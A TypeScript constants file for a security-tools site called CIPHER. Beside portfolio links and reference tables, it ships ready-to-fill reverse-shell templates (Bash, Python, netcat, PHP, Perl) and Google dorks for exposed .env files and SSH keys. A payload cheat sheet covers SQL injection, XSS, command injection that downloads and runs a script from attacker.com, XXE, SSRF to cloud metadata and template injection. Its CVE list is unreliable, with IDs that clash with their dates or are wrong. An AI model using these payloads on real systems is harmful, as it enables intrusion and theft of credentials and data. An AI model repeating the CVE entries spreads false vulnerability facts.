
import { Language, SocialLink, ServiceItem, Vulnerability, WorkflowStep } from './types';
import { Github, Twitter, Linkedin, Youtube, ExternalLink, Hash, Shield, Terminal, Globe, Lock, Cpu, Code, Database, Wifi, Flag, Box } from 'lucide-react';
import React from 'react';

export const CREATOR_NAME = "Biruk Getachew";
export const APP_NAME = "CIPHER";

export const SOCIAL_LINKS: SocialLink[] = [
  { platform: 'Telegram', url: 'https://t.me/cipher_attacks', icon: 'send' },
  { platform: 'X (Twitter)', url: 'https://x.com/Cipher_attacks', icon: 'twitter' },
  { platform: 'YouTube', url: 'https://www.youtube.com/@cipher-attack', icon: 'youtube' },
  { platform: 'Pinterest', url: 'https://pin.it/3R6Nz', icon: 'pin' },
  { platform: 'GitHub', url: 'https://github.com/cipher-attack', icon: 'github' },
  { platform: 'LinkedIn', url: 'https://et.linkedin.com/in/cipher-attack-93582433b', icon: 'linkedin' },
];

export const PROJECTS = [
  {
    title: 'Cipher Lab',
    desc: 'Advanced cybersecurity experimental lab and testing environment.',
    link: 'https://cipher-lab-eta.vercel.app/',
    tags: ['Next.js', 'Security', 'Lab']
  },
  {
    title: 'Cipher Web',
    desc: 'The official portfolio hub and central command for Cipher operations.',
    link: 'https://cipher-attack.github.io/cipher_web/',
    tags: ['Portfolio', 'React', 'Animation']
  },
  {
    title: 'Sony Repairs',
    desc: 'Professional electronics repair service platform with booking system.',
    link: 'http://sony-repairs.netlify.app',
    tags: ['Service', 'Booking', 'UI/UX']
  },
  {
    title: 'Cipher Vectorizer',
    desc: 'A powerful tool for vector graphics processing and manipulation.',
    link: 'https://cipher-vectorizer.netlify.app/',
    tags: ['Tool', 'Graphics', 'Processing']
  },
  {
    title: 'Cipher Musics',
    desc: 'Immersive music streaming experience with custom audio visualizations.',
    link: 'https://cipher-musics.netlify.app/',
    tags: ['Audio', 'Streaming', 'App']
  }
];

export const TECH_STACK = [
  "React", "Next.js", "TypeScript", "Python", "Kali Linux", "Node.js", "TailwindCSS", "Firebase", "Docker", "Ethical Hacking"
];

export const VULNERABILITIES: Vulnerability[] = [
  {
    id: 'CVE-2025-3094',
    severity: 'CRITICAL',
    score: 10.0,
    description: 'Malicious backdoor discovered in XZ Utils compression library allowing unauthorized remote access.',
    affected: 'Linux Systems (Fedora, Debian, Kali)',
    date: '2024-03-29'
  },
  {
    id: 'CVE-2025-21413',
    severity: 'CRITICAL',
    score: 9.8,
    description: 'Microsoft Outlook Moniker Link vulnerability allowing RCE without user interaction.',
    affected: 'Microsoft Office / Outlook',
    date: '2025-02-13'
  },
  {
    id: 'CVE-2025-23897',
    severity: 'HIGH',
    score: 8.6,
    description: 'Jenkins arbitrary file read vulnerability via CLI command parsing.',
    affected: 'Jenkins Server Core',
    date: '2024-01-24'
  },
  {
    id: 'CVE-2024-4863',
    severity: 'HIGH',
    score: 8.8,
    description: 'Heap buffer overflow in libwebp affecting Chrome, Firefox, and other software.',
    affected: 'Web Browsers & Image Tools',
    date: '2024-09-12'
  }
];

export const WORKFLOW_STEPS: Record<Language, WorkflowStep[]> = {
  [Language.EN]: [
    {
      id: 'recon',
      title: 'Reconnaissance',
      shortDesc: 'Gathering Intelligence',
      fullDesc: 'We employ passive and active OSINT techniques to map the attack surface. This includes DNS enumeration, employee profiling, and technology stack fingerprinting to identify potential entry points without alerting defenses.',
      icon: 'search'
    },
    {
      id: 'weaponization',
      title: 'Weaponization',
      shortDesc: 'Strategy Formulation',
      fullDesc: 'Developing custom payloads and attack vectors tailored to the specific vulnerabilities found. This phase involves creating non-signature-based exploits to bypass WAFs and intrusion detection systems.',
      icon: 'code'
    },
    {
      id: 'delivery',
      title: 'Exploitation',
      shortDesc: 'Breaching the Perimeter',
      fullDesc: 'Executing the attack to gain unauthorized access. We simulate real-world threat actors to test the resilience of your databases, authentication mechanisms, and network segmentation.',
      icon: 'terminal'
    },
    {
      id: 'reporting',
      title: 'Reporting',
      shortDesc: 'Actionable Analytics',
      fullDesc: 'Providing a comprehensive post-mortem. We deliver technical reports for engineers and executive summaries for stakeholders, detailing every risk with a prioritized remediation roadmap.',
      icon: 'file-text'
    }
  ],
  [Language.AM]: [
    {
      id: 'recon',
      title: 'ቅድመ-ጥናት (Recon)',
      shortDesc: 'መረጃ መሰብሰብ',
      fullDesc: 'የጥቃት ወለሉን ለመለካት የተለያዩ የስለላ ዘዴዎችን እንጠቀማለን። ይህ የዲኤንኤስ ጥናት፣ የሰራተኞች መረጃ እና የቴክኖሎጂ አሻራዎችን መለየትን ያካትታል።',
      icon: 'search'
    },
    {
      id: 'weaponization',
      title: 'ዝግጅት (Weaponization)',
      shortDesc: 'የጥቃት ስልት መንደፍ',
      fullDesc: 'ለተገኙት ክፍተቶች የሚሆኑ ልዩ የጥቃት መሳሪያዎችን ማዘጋጀት። ይህ ደረጃ የደህንነት መቆጣጠሪያዎችን (Firewalls) ለማለፍ የሚረዱ ልዩ ኮዶችን መጻፍን ያካትታል።',
      icon: 'code'
    },
    {
      id: 'delivery',
      title: 'ትግበራ (Exploitation)',
      shortDesc: 'ወደ ስርዓቱ መስበር',
      fullDesc: 'ያልተፈቀደ መዳረሻ ለማግኘት ጥቃቱን መፈጸም። የውሂብ ጎታዎችዎን እና የአውታረ መረብ ደህንነትን ለመፈተሽ እንደ እውነተኛ ወንጀለኛ ሆነን እንሞክራለን።',
      icon: 'terminal'
    },
    {
      id: 'reporting',
      title: 'ሪፖርት (Reporting)',
      shortDesc: 'ዝርዝር ትንታኔ',
      fullDesc: 'ሙሉ የኦዲት ሪፖርት ማቅረብ። ለኢንጂነሮች ቴክኒካዊ መረጃ፣ ለባለቤቶች ደግሞ አጠቃላይ ማብራሪያን የያዘ እና መፍትሄዎችን የሚያመላክት ሰነድ እናስረክባለን።',
      icon: 'file-text'
    }
  ]
};

export const MAGIC_BYTES: Record<string, string> = {
  'ffd8ff': 'JPEG Image',
  '89504e47': 'PNG Image',
  '47494638': 'GIF Image',
  '25504446': 'PDF Document',
  '504b0304': 'ZIP Archive (DOCX/XLSX/JAR)',
  '1f8b': 'GZIP Archive',
  '424d': 'BMP Image',
  '494433': 'MP3 Audio',
  '7f454c46': 'ELF Executable (Linux)',
  '4d5a': 'DOS/PE Executable (Windows)',
  '52617221': 'RAR Archive',
  '000001ba': 'MPEG Video',
  '377abcaf': '7Z Archive',
  'fd377a58': 'XZ Archive',
  '00000018': 'MP4 Video (ftyp)',
  '23212f62': 'Shebang (Script)',
  '3c3f786d': 'XML Document',
  'cafebabe': 'Java Class File'
};

export const HASH_PATTERNS = [
  { length: 32, type: 'MD5 / MD4 / MD2 / NTLM' },
  { length: 40, type: 'SHA-1 / RIPEMD-160' },
  { length: 56, type: 'SHA-224' },
  { length: 64, type: 'SHA-256' },
  { length: 96, type: 'SHA-384' },
  { length: 128, type: 'SHA-512 / Whirlpool' },
];

export const SHELL_TEMPLATES = {
  'Bash': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
  'Python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
  'Netcat': 'nc -e /bin/sh {ip} {port}',
  'Netcat (BSD)': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
  'PHP': 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
  'Perl': 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
};

export const GOOGLE_DORKS = {
  'Public Files': 'site:{domain} ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv',
  'Directory Listing': 'site:{domain} intitle:index.of',
  'Config Files': 'site:{domain} ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini',
  'Database Files': 'site:{domain} ext:sql | ext:dbf | ext:mdb',
  'Log Files': 'site:{domain} ext:log',
  'Backup Files': 'site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup',
  'PHP Errors': 'site:{domain} "PHP Parse error" | "PHP Warning" | "PHP Error"',
  'Login Pages': 'site:{domain} inurl:login | inurl:signin | intitle:Login | intitle:Signin',
  'Exposed Git': 'site:{domain} inurl:.git',
  'Env Files': 'site:{domain} ext:env | ext:env.production',
  'WordPress Admins': 'site:{domain} inurl:wp-admin | inurl:wp-login.php',
  'Stack Traces': 'site:{domain} "Exception in thread" | "at java.lang."',
  'S3 Buckets': 'site:s3.amazonaws.com "{domain}"',
  'SSH Keys': 'site:{domain} ext:pem | ext:ppk | ext:key'
};

export const CHEATSHEET_DATA = [
  {
    category: "SQL Injection (SQLi) - Auth Bypass",
    payloads: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT NULL, username, password FROM users--",
      "admin' --",
      "' OR '1'='1' /*",
      "admin' #",
      "' OR 1=1 LIMIT 1 -- -",
      "' AND 1=0 UNION ALL SELECT 'admin', 'hash'"
    ]
  },
  {
    category: "SQL Injection - Union Based",
    payloads: [
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT 1,version(),database()--",
      "' UNION SELECT NULL, table_name FROM information_schema.tables--",
      "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--"
    ]
  },
  {
    category: "Cross Site Scripting (XSS)",
    payloads: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "javascript:alert(1)",
      "'-alert(1)-'",
      "<body onload=alert('XSS')>",
      "\"><script>alert(document.cookie)</script>",
      "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
      "\" onfocus=alert(1) autofocus",
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    ]
  },
  {
    category: "Remote Code Execution (RCE)",
    payloads: [
      "; /bin/sh",
      "| nc -e /bin/sh 10.0.0.1 1234",
      "$(whoami)",
      "`cat /etc/passwd`",
      "&& touch /tmp/pwned",
      "; id",
      "| cat /etc/shadow",
      "; php -r 'echo \"PWNED\";'",
      "|| wget http://attacker.com/shell.sh -O /tmp/shell.sh && sh /tmp/shell.sh"
    ]
  },
  {
    category: "Local File Inclusion (LFI)",
    payloads: [
      "../../../../etc/passwd",
      "../../../../windows/win.ini",
      "php://filter/convert.base64-encode/resource=index.php",
      "....//....//....//etc/passwd",
      "/var/www/html/../../../../etc/shadow",
      "file:///etc/passwd",
      "expect://id",
      "/proc/self/environ"
    ]
  },
  {
    category: "XML External Entity (XXE)",
    payloads: [
      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote;]>",
      "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
    ]
  },
  {
    category: "SSRF (Server Side Request Forgery)",
    payloads: [
      "http://127.0.0.1:80",
      "http://localhost:22",
      "http://169.254.169.254/latest/meta-data/",
      "dict://127.0.0.1:11211/",
      "file:///etc/passwd",
      "gopher://127.0.0.1:25/"
    ]
  },
  {
    category: "Template Injection (SSTI)",
    payloads: [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "#{7*7}",
      "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
    ]
  },
  {
    category: "Cloud Metadata (AWS/GCP/Azure)",
    payloads: [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/user-data/",
      "http://169.254.169.254/metadata/v1/instance",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    ]
  },
  {
    category: "JWT Attacks",
    payloads: [
      "Change algorithm to 'None'",
      "Remove signature section",
      "Brute force HMAC secret",
      "Change 'alg' to 'HS256' using Public Key",
      "Inject 'kid' (Key ID) vulnerability"
    ]
  },
  {
    category: "API Injection",
    payloads: [
      "?limit=9999999",
      "?id=1 OR 1=1",
      "POST /api/v1/user (Mass Assignment)",
      "GET /api/v1/users/admin (IDOR)",
      "Sending XML to JSON endpoint (XXE)",
      "?debug=true",
      "HTTP Verb Tampering (HEAD/PUT/DELETE)"
    ]
  }
];

export const PORTS_DATA = [
  { port: 21, service: 'FTP', desc: 'File Transfer Protocol' },
  { port: 22, service: 'SSH', desc: 'Secure Shell' },
  { port: 23, service: 'Telnet', desc: 'Unencrypted Text Comm' },
  { port: 25, service: 'SMTP', desc: 'Simple Mail Transfer' },
  { port: 53, service: 'DNS', desc: 'Domain Name System' },
  { port: 80, service: 'HTTP', desc: 'HyperText Transfer' },
  { port: 110, service: 'POP3', desc: 'Post Office Protocol' },
  { port: 143, service: 'IMAP', desc: 'Internet Message Access' },
  { port: 443, service: 'HTTPS', desc: 'Secure HTTP' },
  { port: 445, service: 'SMB', desc: 'Server Message Block' },
  { port: 3306, service: 'MySQL', desc: 'MySQL Database' },
  { port: 3389, service: 'RDP', desc: 'Remote Desktop' },
  { port: 5432, service: 'PostgreSQL', desc: 'Postgres Database' },
  { port: 6379, service: 'Redis', desc: 'Redis Key-Value' },
  { port: 8080, service: 'HTTP-Alt', desc: 'Web Proxy / Tomcat' },
  { port: 27017, service: 'MongoDB', desc: 'NoSQL Database' }
];

export const LINUX_COMMANDS = [
  { cmd: 'ls -la', desc: 'List all files with permissions' },
  { cmd: 'chmod 755 file', desc: 'Change file permissions' },
  { cmd: 'chown user:group file', desc: 'Change ownership' },
  { cmd: 'ps aux | grep process', desc: 'Find running process' },
  { cmd: 'netstat -tulpn', desc: 'Show listening ports' },
  { cmd: 'tar -czvf archive.tar.gz dir', desc: 'Compress directory' },
  { cmd: 'grep -r "text" .', desc: 'Search text recursively' },
  { cmd: 'ssh user@host', desc: 'Remote login' },
  { cmd: 'scp file user@host:/path', desc: 'Secure copy file' },
  { cmd: 'wget url', desc: 'Download file' }
];

export const GIT_COMMANDS = [
  { cmd: 'git init', desc: 'Initialize repo' },
  { cmd: 'git clone url', desc: 'Clone repository' },
  { cmd: 'git add .', desc: 'Stage all changes' },
  { cmd: 'git commit -m "msg"', desc: 'Commit changes' },
  { cmd: 'git push origin main', desc: 'Push to remote' },
  { cmd: 'git pull', desc: 'Pull changes' },
  { cmd: 'git branch', desc: 'List branches' },
  { cmd: 'git checkout -b branch', desc: 'Create/Switch branch' },
  { cmd: 'git merge branch', desc: 'Merge branch' },
  { cmd: 'git log --oneline', desc: 'View commit history' }
];

export const HTTP_STATUS = [
  { code: 200, msg: 'OK', desc: 'Success' },
  { code: 301, msg: 'Moved Permanently', desc: 'Redirect' },
  { code: 400, msg: 'Bad Request', desc: 'Client Error' },
  { code: 401, msg: 'Unauthorized', desc: 'Auth Required' },
  { code: 403, msg: 'Forbidden', desc: 'Access Denied' },
  { code: 404, msg: 'Not Found', desc: 'Resource Missing' },
  { code: 500, msg: 'Internal Server Error', desc: 'Server Crash' },
  { code: 502, msg: 'Bad Gateway', desc: 'Upstream Error' },
  { code: 503, msg: 'Service Unavailable', desc: 'Overloaded' }
];

export const DOCKER_SECURITY_RULES = [
    { pattern: /USER\s+root/i, message: "Avoid running container as root", severity: "Critical" },
    { pattern: /:latest/i, message: "Avoid using 'latest' tag, pin specific version", severity: "Warning" },
    { pattern: /ADD\s+http/i, message: "Avoid using ADD for remote URLs, use curl/wget", severity: "Medium" },
    { pattern: /privileged/i, message: "Avoid running in privileged mode", severity: "Critical" },
    { pattern: /EXPOSE\s+22/i, message: "Exposing SSH port (22) is not recommended", severity: "High" }
];

export const FAKE_ID_DATA = {
    names: ["John Doe", "Jane Smith", "Alice Johnson", "Bob Williams", "Charlie Brown", "David Miller", "Eva Wilson", "Frank Moore", "Grace Taylor", "Henry Anderson"],
    cities: ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"],
    domains: ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com"]
};

export const DREAD_CATEGORIES = [
    { name: "Damage", desc: "How bad would an attack be?" },
    { name: "Reproducibility", desc: "How easy is it to reproduce?" },
    { name: "Exploitability", desc: "How much work is it to launch the attack?" },
    { name: "Affected Users", desc: "How many people will be impacted?" },
    { name: "Discoverability", desc: "How easy is it to discover the threat?" }
];

export const HOMOGRAPH_MAP: Record<string, string> = {
  'a': 'а', 'c': 'с', 'e': 'е', 'o': 'о', 'p': 'р', 'x': 'х', 'y': 'у', 'A': 'А', 'B': 'В', 'C': 'С', 'E': 'Е', 'H': 'Н', 'I': 'І', 'J': 'Ј', 'K': 'К', 'M': 'М', 'O': 'О', 'P': 'Р', 'T': 'Т', 'X': 'Х', 'Y': 'Ү'
};

export const MORSE_CODE_MAP: Record<string, string> = {
  'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
  'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
  'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
  'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
  'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
  '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
  '9': '----.', '0': '-----', ' ': ' / '
};

export const CONTENT = {
  [Language.EN]: {
    nav: {
      home: "Home",
      projects: "Projects",
      tools: "Tools"
    },
    hero: {
      subtitle: "Advanced cybersecurity solutions and digital warfare tools designed for the modern age.",
      ctaSecondary: "View Projects"
    },
    projects: {
      title: "Projects",
      subtitle: "A collection of advanced tools and platforms built for security and utility."
    },
    tools: {
      title: "Cipher Tools"
    },
    services: {
      title: "Operational Workflow",
      subtitle: "From reconnaissance to reporting, we follow a strict military-grade engagement protocol."
    },
    footer: {
      rights: "© 2025 CIPHER. All rights reserved.",
      builtBy: "Architected by"
    },
    ai: {
      title: "Cipher AI",
      welcome: "Connection established. I am Cipher AI. How may I assist with your security operations today?",
      placeholder: "Enter command or query..."
    }
  },
  [Language.AM]: {
    nav: {
      home: "መነሻ",
      projects: "ፕሮጀክቶች",
      tools: "መሳሪያዎች"
    },
    hero: {
      subtitle: "ለዘመናዊው ዓለም የተነደፉ የሳይበር ደህንነት መፍትሄዎች እና የዲጂታል ጦርነት መሳሪያዎች።",
      ctaSecondary: "ፕሮጀክቶችን ይመልከቱ"
    },
    projects: {
      title: "ፕሮጀክቶች",
      subtitle: "ለደህንነት እና ለአገልግሎት የተገነቡ የላቁ መሳሪያዎች እና መድረኮች ስብስብ።"
    },
    tools: {
      title: "የሳይፈር መሳሪያዎች"
    },
    services: {
      title: "የአሠራር ሂደት",
      subtitle: "ከቅድመ-ጥናት እስከ ሪፖርት አቀራረብ፣ ጥብቅ ወታደራዊ ደረጃ ያለው የውል ስምምነት ፕሮቶኮልን እንከተላለን።"
    },
    footer: {
      rights: "© 2025 ሳይፈር። መብቱ በህግ የተጠበቀ ነው።",
      builtBy: "የተገነባው በ"
    },
    ai: {
      title: "ሳይፈር AI",
      welcome: "ግኑኝነት ተፈጥሯል። እኔ ሳይፈር AI ነኝ። በደህንነት ስራዎ ዛሬ እንዴት ልርዳዎት?",
      placeholder: "ትእዛዝ ወይም ጥያቄ ያስገቡ..."
    }
  }
};
